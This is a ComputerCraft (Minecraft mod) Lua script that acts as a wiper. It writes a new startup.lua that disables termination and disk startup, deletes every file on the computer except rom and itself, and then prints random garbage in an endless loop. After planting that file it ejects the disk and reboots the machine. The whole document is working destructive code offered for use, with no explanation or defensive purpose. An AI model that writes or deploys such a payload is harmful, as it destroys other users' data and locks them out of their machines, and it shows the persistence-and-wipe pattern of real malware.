local code = [[
term.clear()
os.pullEvent = os.pullEventRaw
settings.set("shell.allow_disk_startup", false)
settings.save()
term.setCursorPos(1, 1)

-- Function to recursively delete all files and folders in a directory except specified files or folders
local function deleteFiles(directory, exceptions)
  for _, entry in ipairs(fs.list(directory)) do
    local fullPath = fs.combine(directory, entry)
    if fs.isDir(fullPath) then
      if not exceptions[entry] then
        deleteFiles(fullPath, exceptions)
        fs.delete(fullPath) -- Delete the folder after deleting its contents
      end
    elseif not exceptions[entry] then
      fs.delete(fullPath) -- Delete the file
    end
  end
end

local exceptions = {
  ["rom"] = true,
  ["startup.lua"] = true
}

-- Specify the path to the target directory
local targetDir = "/"

-- Call the function to delete files and folders, passing the target directory and exceptions table
deleteFiles(targetDir, exceptions)

local function generateRandomCharacter()
    local code = math.random(0, 255)
    return string.char(code)
end

for i = 1, 50 do
    local randomCharacter = generateRandomCharacter()
    io.write(randomCharacter)
end
io.write("\n")

while true do
    os.sleep(0.1)
    for i = 1, 50 do
        local randomCharacter = generateRandomCharacter()
        io.write(randomCharacter)
    end
    io.write("\n")
end
]]

local file = io.open("startup.lua", "wb")
file:write(code)
file:close()
print("its NightTime.")
function eject()
  local drive = peripheral.find("drive")
  drive.ejectDisk()
end
pcall(eject)
shell.run("reboot")
